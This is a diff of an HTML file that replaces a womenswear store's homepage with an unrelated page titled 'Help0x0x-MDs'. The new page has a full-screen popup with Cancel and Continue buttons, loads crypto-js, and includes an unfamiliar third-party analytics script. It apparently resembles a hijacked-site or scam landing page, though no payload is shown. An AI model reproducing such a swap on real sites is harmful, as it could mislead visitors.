@@ -1,262 +1,749 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Frill Monarch | Romantic Modern Womenswear — Dresses, Blouses & Tailoring</title>
-<meta name="description" content="Shop Frill Monarch: ruffle dresses, frill blouses, pleated skirts, soft tailoring and pearl accessories in considered fabrics. Free US shipping over $150.">
-<meta name="robots" content="index, follow">
-<link rel="canonical" href="https://frillmonarch.com/">
-<meta property="og:type" content="website">
-<meta property="og:site_name" content="Frill Monarch">
-<meta property="og:title" content="Frill Monarch | Romantic Modern Womenswear — Dresses, Blouses & Tailoring">
-<meta property="og:description" content="Shop Frill Monarch: ruffle dresses, frill blouses, pleated skirts, soft tailoring and pearl accessories in considered fabrics. Free US shipping over $150.">
-<meta property="og:url" content="https://frillmonarch.com/">
-<meta property="og:image" content="https://images.pexels.com/photos/17993590/pexels-photo-17993590.jpeg?auto=compress&cs=tinysrgb&w=1200">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="theme-color" content="#2B1B2E">
-<link rel="icon" href="assets/images/favicon.svg" type="image/svg+xml">
-<link rel="preconnect" href="https://images.pexels.com">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,500;0,600;1,500&family=Jost:wght@300;400;500&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="assets/css/style.css">
-<!-- Google tag (gtag.js) with Consent Mode v2 -->
-<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('consent','default',{ad_storage:'denied',ad_user_data:'denied',ad_personalization:'denied',analytics_storage:'denied',wait_for_update:500});</script>
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
-<script>gtag('js',new Date());gtag('config','G-0LY0HY7L01');</script>
-<script type="application/ld+json">{"@context": "https://schema.org", "@type": "ClothingStore", "name": "Frill Monarch", "url": "https://frillmonarch.com/", "image": "https://images.pexels.com/photos/17993590/pexels-photo-17993590.jpeg?auto=compress&cs=tinysrgb&w=1200", "telephone": "+1-888-777-5845", "email": "hello@frillmonarch.com", "priceRange": "$$", "address": {"@type": "PostalAddress", "streetAddress": "181 Mercer Street", "addressLocality": "New York", "addressRegion": "NY", "postalCode": "10012", "addressCountry": "US"}, "openingHoursSpecification": [{"@type": "OpeningHoursSpecification", "dayOfWeek": ["Monday", "Tuesday", "Wednesday", "Thursday", "Friday"], "opens": "09:00", "closes": "18:00"}]}</script><script type="application/ld+json">{"@context": "https://schema.org", "@type": "FAQPage", "mainEntity": [{"@type": "Question", "name": "How do I place an order?", "acceptedAnswer": {"@type": "Answer", "text": "Add pieces to your bag, choose a shipping option and send your order request. Our studio team confirms stock and emails you a secure payment link within one business day. Your order ships as soon as payment is complete."}}, {"@type": "Question", "name": "Can I change or cancel my order?", "acceptedAnswer": {"@type": "Answer", "text": "Yes — until you've completed payment, simply reply to your confirmation email or call us. After payment, we can usually make changes if the parcel hasn't left our studio yet."}}, {"@type": "Question", "name": "Do you restock sold-out pieces?", "acceptedAnswer": {"@type": "Answer", "text": "Our core styles are restocked regularly. Save a piece to your wishlist and check back, or email us and we'll let you know when your size returns."}}, {"@type": "Question", "name": "How much is shipping?", "acceptedAnswer": {"@type": "Answer", "text": "Standard shipping within the US is $8.95, or free on orders over $150. Express shipping is $18. Full details are in our Shipping Policy."}}, {"@type": "Question", "name": "How long does delivery take?", "acceptedAnswer": {"@type": "Answer", "text": "Standard orders usually arrive within 3–6 business days after dispatch, and express orders within 1–2 business days."}}, {"@type": "Question", "name": "What is your returns policy?", "acceptedAnswer": {"@type": "Answer", "text": "Unworn pieces with tags attached can be returned within 30 days of delivery for a refund or exchange. See our Returns & Refund Policy."}}, {"@type": "Question", "name": "How do your sizes run?", "acceptedAnswer": {"@type": "Answer", "text": "Most pieces are true to size. Each product has a fit note, and our size finder matches your measurements to our chart."}}, {"@type": "Question", "name": "How should I care for linen and silk?", "acceptedAnswer": {"@type": "Answer", "text": "Wash linen cool and line dry; it softens beautifully over time. Hand wash silk in cool water with a gentle detergent, or dry clean, and steam rather than iron where possible."}}, {"@type": "Question", "name": "Will my ruffles lose their shape?", "acceptedAnswer": {"@type": "Answer", "text": "Our ruffles are cut and finished to hold their shape. A quick steam after washing is all they usually need to look fresh again."}}]}</script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Help0x0x-MDs</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+  
+    :root{
+      --ink:#0b1020;
+      --muted:#64748b;
+      --line:#e9ebf2;
+      --surface:#f8fafc;
+      --brand:#6d28d9;
+      --brand-dark:#5b21b6;
+      --accent:#db2777;
+      --radius:18px;
+      --shadow-sm:0 1px 2px rgba(16,24,40,.06), 0 1px 3px rgba(16,24,40,.08);
+      --shadow-md:0 12px 30px -14px rgba(16,24,40,.22);
+      --shadow-lg:0 28px 60px -24px rgba(16,24,40,.32);
+      --max:1180px;
+    }
+
+    *,*::before,*::after{ box-sizing:border-box; }
+    html{ scroll-behavior:smooth; }
+    body{
+      margin:0;
+      font-family:'Inter',system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+      color:var(--ink);
+      background:#fff;
+      line-height:1.6;
+      -webkit-font-smoothing:antialiased;
+    }
+    img{ max-width:100%; display:block; }
+    a{ color:inherit; text-decoration:none; }
+    button{ font:inherit; }
+    ul{ list-style:none; margin:0; padding:0; }
+
+    .container{ width:min(var(--max), 100% - 48px); margin-inline:auto; }
+
+    /* ============================================================
+       LOADING POPUP
+       ============================================================ */
+    .popup{
+      position:fixed; inset:0; z-index:9999;
+      display:flex; align-items:center; justify-content:center;
+      background:#fff; padding:24px;
+    }
+    .popup-content{
+      width:100%; max-width:560px;
+      text-align:center;
+      animation:popIn .5s cubic-bezier(.2,.8,.3,1) both;
+    }
+    @keyframes popIn{
+      from{ opacity:0; transform:translateY(14px) scale(.98); }
+      to{ opacity:1; transform:none; }
+    }
+    .loading-gif{
+      width:120px; height:120px;
+      margin:0 auto 26px;
+    }
+    .popup-title{
+      font-size:clamp(1.3rem,2.6vw,1.6rem);
+      font-weight:800; letter-spacing:-.025em;
+      margin:0 0 8px;
+    }
+    .popup-content p.sub{
+      margin:0 0 32px;
+      color:var(--muted);
+      font-size:.95rem;
+      font-weight:500;
+    }
+    .buttons{
+      display:flex; justify-content:center; gap:14px; flex-wrap:wrap;
+    }
+    .buttons button{
+      min-width:152px;
+      padding:14px 30px;
+      border:0; border-radius:13px;
+      cursor:pointer; font-weight:700; font-size:1rem;
+      transition:transform .18s ease, box-shadow .18s ease, background .18s ease;
+    }
+    #cancelBtn{ background:#f1f5f9; color:#334155; }
+    #cancelBtn:hover{ background:#e2e8f0; }
+    #continueBtn{
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff;
+      box-shadow:0 16px 30px -14px rgba(109,40,217,.85);
+    }
+    #continueBtn:hover{ transform:translateY(-2px); }
+
+    .hint{
+      background:linear-gradient(90deg,#1e1b4b,#4c1d95 45%,#831843);
+      color:#ede9fe;
+      text-align:center;
+      font-size:.82rem;
+      font-weight:600;
+      letter-spacing:.02em;
+      padding:11px 20px;
+      min-height:42px;
+      display:flex; align-items:center; justify-content:center;
+      gap:10px;
+    }
+
+    .nav{
+      position:sticky; top:0; z-index:80;
+      display:flex; align-items:center; gap:26px;
+      height:72px;
+      padding:0 max(24px, calc((100vw - var(--max)) / 2));
+      background:rgba(255,255,255,.86);
+      backdrop-filter:blur(16px);
+      -webkit-backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--line);
+    }
+    .brand{
+      display:flex; align-items:center; gap:11px;
+      font-weight:800; font-size:1.12rem;
+      letter-spacing:-.025em; white-space:nowrap;
+    }
+    .brand-mark{
+      width:36px; height:36px; flex:none;
+      display:grid; place-items:center;
+      border-radius:11px; font-size:1rem;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      box-shadow:0 10px 22px -10px rgba(109,40,217,.9);
+    }
+
+    .links{ display:flex; gap:6px; }
+    .links a{
+      font-size:.9rem; font-weight:500; color:#4b5563;
+      padding:8px 14px; border-radius:10px;
+      transition:color .18s ease, background .18s ease;
+    }
+    .links a:hover{ color:var(--brand); background:#f5f3ff; }
+
+    .clock{
+      margin-left:auto;
+      display:inline-flex; align-items:center; gap:6px;
+      font-size:.78rem; font-weight:600; color:var(--brand-dark);
+      background:#f5f3ff; border:1px solid #ede9fe;
+      padding:7px 13px; border-radius:999px; white-space:nowrap;
+    }
+    .cart-btn{
+      display:inline-flex; align-items:center; gap:8px;
+      border:0; cursor:pointer;
+      background:var(--ink); color:#fff;
+      font-weight:600; font-size:.88rem;
+      padding:10px 18px; border-radius:999px;
+      transition:transform .18s ease, background .18s ease;
+    }
+    .cart-btn:hover{ background:var(--brand); transform:translateY(-1px); }
+    .cart-btn .badge{
+      background:#fff; color:var(--ink);
+      border-radius:999px; min-width:20px; height:20px;
+      display:grid; place-items:center;
+      padding:0 6px; font-size:.72rem; font-weight:800;
+    }
+
+    @media (max-width:900px){
+      .links{ display:none; }
+      .clock{ display:none; }
+    }
+    @media (max-width:560px){
+      .nav{ gap:14px; height:66px; padding-inline:18px; }
+      .cart-btn{ padding:9px 14px; font-size:.82rem; }
+    }
+
+    /* ============================================================
+       HERO
+       ============================================================ */
+    .hero{
+      display:grid;
+      grid-template-columns:1.03fr .97fr;
+      gap:60px; align-items:center;
+      padding:76px max(24px, calc((100vw - var(--max)) / 2)) 68px;
+      background:
+        radial-gradient(900px 420px at 8% -20%, rgba(109,40,217,.14), transparent 62%),
+        radial-gradient(760px 420px at 98% -6%, rgba(219,39,119,.12), transparent 58%),
+        linear-gradient(180deg,#fbfaff,#fff);
+    }
+    @media (max-width:960px){
+      .hero{ grid-template-columns:1fr; gap:44px; padding-top:52px; padding-bottom:52px; }
+    }
+
+    .eyebrow{
+      display:inline-flex; align-items:center; gap:8px;
+      background:#fff; border:1px solid #ede9fe;
+      color:var(--brand-dark);
+      font-size:.78rem; font-weight:700;
+      letter-spacing:.06em; text-transform:uppercase;
+      padding:7px 15px; border-radius:999px;
+      box-shadow:var(--shadow-sm);
+      margin-bottom:20px;
+    }
+    .eyebrow .dot{
+      width:7px; height:7px; border-radius:50%;
+      background:var(--accent);
+      box-shadow:0 0 0 4px rgba(219,39,119,.16);
+    }
+
+    .hero-text h1{
+      font-size:clamp(2.2rem,5vw,3.4rem);
+      line-height:1.08; letter-spacing:-.035em;
+      font-weight:900; margin:0 0 18px;
+    }
+    .hero-text h1 span{
+      background:linear-gradient(115deg,var(--brand),var(--accent));
+      -webkit-background-clip:text; background-clip:text; color:transparent;
+    }
+    .hero-text p{
+      font-size:1.05rem; color:var(--muted);
+      max-width:490px; margin:0 0 30px;
+    }
+
+    .cta{
+      display:inline-flex; align-items:center; gap:9px;
+      padding:15px 30px; border-radius:999px;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff; font-weight:700; font-size:.95rem;
+      box-shadow:0 16px 32px -16px rgba(109,40,217,.9);
+      transition:transform .18s ease, box-shadow .18s ease;
+    }
+    .cta:hover{ transform:translateY(-2px); box-shadow:0 22px 40px -18px rgba(109,40,217,.95); }
+
+    .hero-stats{
+      display:flex; gap:34px; flex-wrap:wrap;
+      margin-top:40px; padding-top:26px;
+      border-top:1px solid var(--line);
+    }
+    .hero-stats strong{
+      display:block; font-size:1.35rem; font-weight:800; letter-spacing:-.02em;
+    }
+    .hero-stats span{ font-size:.82rem; color:var(--muted); }
+
+    .hero-img{
+      width:100%; aspect-ratio:5/4; object-fit:cover;
+      border-radius:26px;
+      box-shadow:var(--shadow-lg);
+    }
+
+    /* ============================================================
+       TRUST STRIP
+       ============================================================ */
+    .trust{
+      border-block:1px solid var(--line);
+      background:var(--surface);
+    }
+    .trust-grid{
+      display:grid; grid-template-columns:repeat(4,1fr);
+      gap:10px; padding:22px 0;
+    }
+    .trust-item{
+      display:flex; align-items:center; justify-content:center; gap:9px;
+      font-size:.85rem; font-weight:600; color:#475569;
+      padding:6px 10px; border-right:1px solid var(--line);
+    }
+    .trust-item:last-child{ border-right:0; }
+    .trust-item span{ font-size:1.05rem; }
+    @media (max-width:860px){
+      .trust-grid{ grid-template-columns:repeat(2,1fr); gap:14px; }
+      .trust-item{ border-right:0; justify-content:flex-start; }
+    }
+
+    /* ============================================================
+       SECTIONS
+       ============================================================ */
+    .section{ padding:76px 0; }
+    .section-head{ text-align:center; max-width:640px; margin:0 auto 42px; }
+    .section-head .kicker{
+      display:inline-block;
+      font-size:.76rem; font-weight:800;
+      letter-spacing:.12em; text-transform:uppercase;
+      color:var(--brand); margin-bottom:10px;
+    }
+    .section-head h2{
+      font-size:clamp(1.6rem,3.2vw,2.2rem);
+      font-weight:900; letter-spacing:-.03em;
+      margin:0 0 10px; line-height:1.15;
+    }
+    .section-head p{ margin:0; color:var(--muted); font-size:.97rem; }
+
+
+    .grid{
+      display:grid; gap:24px;
+      grid-template-columns:repeat(auto-fill,minmax(250px,1fr));
+    }
+    .card{
+      display:flex; flex-direction:column;
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius); overflow:hidden;
+      transition:transform .22s ease, box-shadow .22s ease, border-color .22s ease;
+    }
+    .card:hover{
+      transform:translateY(-6px);
+      box-shadow:var(--shadow-lg);
+      border-color:transparent;
+    }
+    .card-media{
+      position:relative; aspect-ratio:4/3;
+      overflow:hidden; background:#f1f5f9;
+    }
+    .card-media img{
+      width:100%; height:100%; object-fit:cover;
+      transition:transform .55s cubic-bezier(.2,.7,.3,1);
+    }
+    .card:hover .card-media img{ transform:scale(1.07); }
+
+    .card .badge{
+      position:absolute; top:12px; left:12px;
+      font-size:.68rem; font-weight:800; letter-spacing:.06em;
+      text-transform:uppercase; color:#fff;
+      padding:6px 11px; border-radius:999px;
+      background:var(--ink);
+    }
+    .card .badge--sale{ background:var(--accent); }
+    .card .badge--new{ background:#0ea5e9; }
+
+    .card .body{
+      padding:16px 18px 18px;
+      display:flex; flex-direction:column; flex:1;
+    }
+    .card .cat{
+      font-size:.7rem; font-weight:700; letter-spacing:.1em;
+      text-transform:uppercase; color:#94a3b8; margin-bottom:6px;
+    }
+    .card h3{
+      margin:0 0 8px; font-size:1rem; font-weight:700; letter-spacing:-.015em;
+    }
+    .price-row{
+      display:flex; align-items:baseline; gap:8px;
+      margin-top:auto; padding-top:6px;
+    }
+    .card .price{
+      font-size:1.12rem; font-weight:800;
+      letter-spacing:-.02em; color:var(--ink);
+    }
+    .card .old{
+      font-size:.85rem; color:#a3aab8;
+      text-decoration:line-through; font-weight:500;
+      margin:0;
+    }
+    .save{
+      margin-left:auto;
+      font-size:.7rem; font-weight:800;
+      color:#047857; background:#ecfdf5;
+      padding:3px 8px; border-radius:999px;
+    }
+
+    .add{
+      margin-top:14px; width:100%;
+      display:inline-flex; align-items:center; justify-content:center; gap:8px;
+      border:1px solid var(--ink); background:#fff; color:var(--ink);
+      font-weight:700; font-size:.88rem;
+      padding:11px; border-radius:11px; cursor:pointer;
+      transition:background .2s ease, color .2s ease, transform .18s ease;
+    }
+    .add:hover{ background:var(--ink); color:#fff; transform:translateY(-1px); }
+    .add:active{ transform:translateY(0); }
+
+  
+    .about{
+      background:var(--surface);
+      border-block:1px solid var(--line);
+    }
+    .features{
+      display:grid; gap:22px;
+      grid-template-columns:repeat(auto-fit,minmax(210px,1fr));
+    }
+    .feature{
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius);
+      padding:28px 24px;
+      text-align:left;
+      transition:transform .22s ease, box-shadow .22s ease;
+    }
+    .feature:hover{ transform:translateY(-4px); box-shadow:var(--shadow-md); }
+    .feature span{
+      display:grid; place-items:center;
+      width:48px; height:48px;
+      border-radius:14px; font-size:1.3rem;
+      background:linear-gradient(135deg,#f5f3ff,#fdf2f8);
+      border:1px solid #ede9fe;
+      margin-bottom:16px;
+    }
+    .feature h3{ margin:0 0 6px; font-size:1rem; font-weight:800; letter-spacing:-.015em; }
+    .feature p{ margin:0; color:var(--muted); font-size:.87rem; line-height:1.55; }
+
+    /* ============================================================
+       FOOTER
+       ============================================================ */
+    .footer{
+      background:#0b1020;
+      color:#94a3b8;
+      text-align:center;
+      padding:44px 24px;
+      font-size:.85rem;
+    }
+    .footer .fbrand{
+      display:inline-flex; align-items:center; gap:10px;
+      color:#fff; font-weight:800; font-size:1rem;
+      letter-spacing:-.02em; margin-bottom:10px;
+    }
+    .footer p{ margin:0 0 6px; }
+    .footer small{ color:#64748b; font-size:.78rem; }
+
+  
+    @media (prefers-reduced-motion:reduce){
+      *{ animation-duration:.001ms !important; transition-duration:.001ms !important; }
+      html{ scroll-behavior:auto; }
+    }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
-<body data-base="">
-<a class="skip" href="#main">Skip to content</a>
-<div class="promo">Free standard shipping on US orders over $150 · Free 30-day returns · <a href="shipping-policy.html">Details</a></div>
-<header class="site-header"><div class="wrap">
-  <div class="h-top">
-    <div class="h-tools"><button class="icon-btn menu-btn" type="button" aria-label="Open menu" aria-expanded="false" aria-controls="drawer"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M3 7h18M3 12h18M3 17h12"/></svg></button>
-      <button class="icon-btn search-btn" type="button" aria-label="Search the collection"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="11" cy="11" r="7"/><path d="m20 20-4-4"/></svg></button></div>
-    <a class="logo" href="index.php" aria-label="Frill Monarch home"><svg viewBox="0 0 30 20" fill="none" stroke="currentColor" stroke-width="1.4" aria-hidden="true"><path d="M2 17h26M3 15 1.5 5l7.5 5L15 2l6 8 7.5-5L27 15z"/><circle cx="15" cy="2" r="1.2" fill="currentColor"/></svg><b>Frill Monarch</b><small>Romantic modern womenswear</small></a>
-    <div class="h-tools right"><a class="icon-btn hide-sm" href="wishlist.html" aria-label="Wishlist"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 20s-7-4.4-7-10a4 4 0 0 1 7-2.6A4 4 0 0 1 19 10c0 5.6-7 10-7 10z"/></svg><span class="badge" data-wish-count></span></a>
-      <a class="icon-btn" href="bag.html" aria-label="Shopping bag"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M5 8h14l-1 12H6z"/><path d="M9 8V6a3 3 0 0 1 6 0v2"/></svg><span class="badge" data-bag-count></span></a></div>
-  </div>
-  <nav class="h-nav" aria-label="Main"><ul><li><a href="index.php" aria-current="page">Home</a></li><li><a href="shop.html">Shop All</a></li><li><a href="shop.html?cat=dresses">Dresses</a></li><li><a href="shop.html?cat=tailoring">Tailoring</a></li><li><a href="shop.html?cat=accessories">Accessories</a></li><li><a href="size-guide.html">Size Guide</a></li><li><a href="about.html">Our Story</a></li><li><a href="contact.html">Contact</a></li></ul></nav>
-  <div class="searchbar"><form action="shop.html" role="search"><label class="sr-only" for="site-q">Search</label><input id="site-q" name="q" placeholder="Search dresses, blouses, blazers…"><button class="btn btn-sm btn-solid" type="submit">Search</button></form></div>
-</div></header>
-<div class="scrim"></div>
-<nav class="drawer" id="drawer" aria-label="Mobile"><button class="icon-btn drawer-close" type="button" aria-label="Close menu" style="float:right">✕</button>
-  <a class="logo" href="index.php" style="align-items:flex-start"><svg viewBox="0 0 30 20" fill="none" stroke="currentColor" stroke-width="1.4" aria-hidden="true"><path d="M2 17h26M3 15 1.5 5l7.5 5L15 2l6 8 7.5-5L27 15z"/><circle cx="15" cy="2" r="1.2" fill="currentColor"/></svg><b>Frill Monarch</b></a><ul><li><a href="index.php">Home</a></li><li><a href="shop.html">Shop All</a></li><li><a href="shop.html?cat=dresses">Dresses</a></li><li><a href="shop.html?cat=tailoring">Tailoring</a></li><li><a href="shop.html?cat=accessories">Accessories</a></li><li><a href="size-guide.html">Size Guide</a></li><li><a href="about.html">Our Story</a></li><li><a href="contact.html">Contact</a></li><li><a href="wishlist.html">Wishlist</a></li><li><a href="bag.html">Your Bag</a></li></ul>
-  <p class="muted" style="font-size:.9rem">+1-888-777-5845<br>181 Mercer Street, New York</p></nav>
-<main id="main">
-<!-- 1 HERO SLIDER -->
-<section class="slider" aria-roledescription="carousel" aria-label="Featured collections">
-  <div class="slide on">
-    <img src="https://images.pexels.com/photos/17993590/pexels-photo-17993590.jpeg?auto=compress&cs=tinysrgb&w=1800" alt="Woman in a flowing floral dress walking through a sunlit summer field" width="1800" height="1200" fetchpriority="high">
-    <div class="wrap copy"><span class="eyebrow">The Summer Frill Edit</span><h1>Soft shapes, <em>sunlit</em> days.</h1><p>Floaty midis, frill-trimmed blouses and easy linens — made to move with you from long lunches to late walks home.</p><a class="btn btn-light" href="shop.html?cat=dresses">Shop dresses</a></div>
-  </div>
-  <div class="slide" aria-hidden="true">
-    <img src="https://images.pexels.com/photos/29232950/pexels-photo-29232950.jpeg?auto=compress&cs=tinysrgb&w=1800" alt="Woman in a white dress standing in a field of yellow wildflowers under a blue sky" width="1800" height="1200" loading="lazy">
-    <div class="wrap copy"><span class="eyebrow">Pure &amp; simple</span><h2>Whites, pearls <em>and</em> gentle light.</h2><p>Cotton broderie, silk and pearl details for the quiet, luminous side of your wardrobe.</p><a class="btn btn-light" href="shop.html?cat=tops">Shop blouses</a></div>
-  </div>
-  <div class="slide" aria-hidden="true">
-    <img src="https://images.pexels.com/photos/18453985/pexels-photo-18453985.jpeg?auto=compress&cs=tinysrgb&w=1800" alt="Smiling woman wearing a green tiered ruffle dress against leafy greenery" width="1800" height="1200" loading="lazy">
-    <div class="wrap copy"><span class="eyebrow">Occasion ready</span><h2>Ruffles with <em>real</em> confidence.</h2><p>Statement dresses for weddings, birthdays and every celebration in between.</p><a class="btn btn-light" href="shop.html">Shop the collection</a></div>
-  </div>
-  <div class="s-ui"><div class="wrap">
-    <span class="s-count"><b>01</b> / 03</span>
-    <div class="s-bars"><button type="button" aria-label="Show slide 1"><i></i></button><button type="button" aria-label="Show slide 2"><i></i></button><button type="button" aria-label="Show slide 3"><i></i></button></div>
-    <div class="s-arrows"><button class="s-prev" type="button" aria-label="Previous slide">←</button><button class="s-next" type="button" aria-label="Next slide">→</button></div>
-  </div></div>
-</section>
+<body>
 
-<!-- 2 VALUE STRIP -->
-<section class="values" aria-label="Shopping with Frill Monarch"><ul>
-  <li><b>Free shipping</b>US orders over $150</li>
-  <li><b>30-day returns</b>Free &amp; easy</li>
-  <li><b>Considered fabrics</b>Linen, silk, organic cotton</li>
-  <li><b>Real people</b>Studio team on hand</li>
-</ul></section>
-
-<!-- 3 CATEGORY CIRCLES -->
-<section class="sec" aria-labelledby="cat-h">
-  <div class="wrap">
-    <div class="title-c"><span class="eyebrow">Shop by category</span><h2 id="cat-h">Find your next <em>favorite</em></h2></div>
-    <div class="circles">
-      <a class="circle" href="shop.html?cat=dresses"><div class="ring"><img src="https://images.pexels.com/photos/27969723/pexels-photo-27969723.jpeg?auto=compress&cs=tinysrgb&w=500" alt="Woman posing outdoors in a ruffled dress" width="500" height="500" loading="lazy"></div><span>Dresses</span><small>Midi · maxi · wrap</small></a>
-      <a class="circle" href="shop.html?cat=tops"><div class="ring"><img src="https://images.pexels.com/photos/14416342/pexels-photo-14416342.jpeg?auto=compress&cs=tinysrgb&w=500" alt="Woman in a white ruffled blouse against a neutral backdrop" width="500" height="500" loading="lazy"></div><span>Blouses</span><small>Frill · silk · poplin</small></a>
-      <a class="circle" href="shop.html?cat=skirts"><div class="ring"><img src="https://images.pexels.com/photos/15206532/pexels-photo-15206532.jpeg?auto=compress&cs=tinysrgb&w=500" alt="Woman wearing a pleated skirt on a sunny park path" width="500" height="500" loading="lazy"></div><span>Skirts</span><small>Pleated · tiered</small></a>
-      <a class="circle" href="shop.html?cat=knitwear"><div class="ring"><img src="https://images.pexels.com/photos/5712104/pexels-photo-5712104.jpeg?auto=compress&cs=tinysrgb&w=500" alt="Smiling woman in a knitted cardigan on the beach" width="500" height="500" loading="lazy"></div><span>Knitwear</span><small>Cardigans · cables</small></a>
-      <a class="circle" href="shop.html?cat=tailoring"><div class="ring"><img src="https://images.pexels.com/photos/8484005/pexels-photo-8484005.jpeg?auto=compress&cs=tinysrgb&w=500" alt="Two women wearing pastel tailored blazers in a studio" width="500" height="500" loading="lazy"></div><span>Tailoring</span><small>Blazers · trousers</small></a>
-      <a class="circle" href="shop.html?cat=accessories"><div class="ring"><img src="https://images.pexels.com/photos/9421333/pexels-photo-9421333.jpeg?auto=compress&cs=tinysrgb&w=500" alt="Close-up of a woman wearing pearl earrings and a pearl necklace" width="500" height="500" loading="lazy"></div><span>Accessories</span><small>Pearls · bags · hats</small></a>
-    </div>
-  </div>
-</section>
-
-<!-- 4 THE FRILL EDIT -->
-<section class="sec bg-white" aria-labelledby="edit-h">
-  <div class="wrap edit3">
-    <img class="i1" src="https://images.pexels.com/photos/32014573/pexels-photo-32014573.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Artistic portrait of a woman in a pink ruffled dress" width="800" height="1120" loading="lazy">
-    <div class="mid"><span class="eyebrow">The Frill Edit</span><h2 id="edit-h">A ruffle, <em>reimagined</em></h2>
-      <p>We love a frill — but never a fussy one. Our ruffles are cut on the bias so they fall softly, finished by hand so they lie flat, and placed where they flatter: a neckline, a hem, a cuff.</p>
-      <p>The result is romance you can wear on a Tuesday.</p><p class="sig">— The Frill Monarch studio</p>
-      <a class="btn" href="shop.html">Explore the edit</a></div>
-    <img class="i2" src="https://images.pexels.com/photos/39296285/pexels-photo-39296285.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Woman in an elegant ruffled dress standing on a staircase" width="800" height="1120" loading="lazy">
-  </div>
-</section>
-
-<!-- 5 OCCASION ARCHES -->
-<section class="sec dark" aria-labelledby="occ-h">
-  <div class="wrap">
-    <div class="title-c"><span class="eyebrow">Dress for the moment</span><h2 id="occ-h">Three occasions, <em>beautifully</em> answered</h2><p>Not sure where to start? Begin with where you're going.</p></div>
-    <div class="arches">
-      <a class="arch" href="shop.html?cat=dresses"><figure><img src="https://images.pexels.com/photos/19400166/pexels-photo-19400166.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Woman in a white dress among hydrangeas and roses in a garden" width="800" height="1170" loading="lazy"></figure><h3>Garden parties</h3><p>Florals, whites and swishy midis</p></a>
-      <a class="arch" href="shop.html?cat=tailoring"><figure><img src="https://images.pexels.com/photos/31823164/pexels-photo-31823164.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Woman in a tailored brown suit standing on an outdoor platform at dusk" width="800" height="1170" loading="lazy"></figure><h3>The working week</h3><p>Soft tailoring and silk shirts</p></a>
-      <a class="arch" href="shop.html?cat=dresses"><figure><img src="https://images.pexels.com/photos/28115171/pexels-photo-28115171.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Woman in a sparkling blue evening gown posing elegantly" width="800" height="1170" loading="lazy"></figure><h3>Evenings out</h3><p>Tulle, satin and statement pieces</p></a>
-    </div>
-  </div>
-</section>
-
-<!-- 6 SILHOUETTE QUIZ -->
-<section class="sec" aria-labelledby="quiz-h">
-  <div class="wrap">
-    <div class="quiz" id="quiz">
-      <div class="quiz-q">
-        <span class="eyebrow">Style finder</span><h2 id="quiz-h">Which Frill Monarch shape is <em>you</em>?</h2>
-        <div class="q-prog" aria-hidden="true"><i></i><i></i><i></i></div>
-        <div class="q-step"><p><b>1.</b> Your ideal Saturday looks like…</p><div class="q-opts">
-          <button type="button" data-pick="dresses">A picnic, a long walk, flowers on the way home <span>→</span></button>
-          <button type="button" data-pick="tailoring">A gallery, then coffee somewhere well designed <span>→</span></button>
-          <button type="button" data-pick="tops">Errands, lunch with friends, no fuss <span>→</span></button>
-          <button type="button" data-pick="skirts">Dancing at a friend's party <span>→</span></button></div></div>
-        <div class="q-step"><p><b>2.</b> Which detail do you always notice?</p><div class="q-opts">
-          <button type="button" data-pick="dresses skirts">Movement — how a hem swings <span>→</span></button>
-          <button type="button" data-pick="tailoring">A sharp shoulder or perfect crease <span>→</span></button>
-          <button type="button" data-pick="tops">A beautiful collar or cuff <span>→</span></button>
-          <button type="button" data-pick="skirts">Color and a little shine <span>→</span></button></div></div>
-        <div class="q-step"><p><b>3.</b> Pick the word that feels most like you.</p><div class="q-opts">
-          <button type="button" data-pick="dresses">Romantic <span>→</span></button>
-          <button type="button" data-pick="tailoring">Polished <span>→</span></button>
-          <button type="button" data-pick="tops">Effortless <span>→</span></button>
-          <button type="button" data-pick="skirts">Playful <span>→</span></button></div></div>
-      </div>
-      <div class="quiz-r" aria-live="polite">
-        <span class="eyebrow" style="color:#E3B7A6">Your result</span>
-        <h3 id="quiz-title">Your style, decoded</h3>
